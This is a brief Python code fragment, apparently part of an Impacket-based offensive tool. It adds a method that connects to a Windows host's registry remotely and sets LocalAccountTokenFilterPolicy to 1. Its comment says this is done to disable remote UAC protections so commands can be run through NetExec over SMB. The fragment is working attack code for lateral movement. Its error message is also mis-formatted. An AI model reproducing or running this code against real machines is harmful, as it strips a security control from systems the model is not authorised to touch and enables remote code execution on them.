...
class RemoteOperations:
    ...
    # New function - disables remote UAC protections to allow for execution via nxc smb
    def disableProtections(self):
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        except:
            raise Exception("Can't open the target protection hive")
        keyHandle = ans['phkResult']
        ans2 = rrp.hBaseRegSetValue(self.__rrp, keyHandle, "LocalAccountTokenFilterPolicy", rrp.REG_DWORD, 1)

        if (ans2['ErrorCode'] != 0): raise Exception("Error 0x%08x while attempting to disable protections", ans2['ErrorCode'])
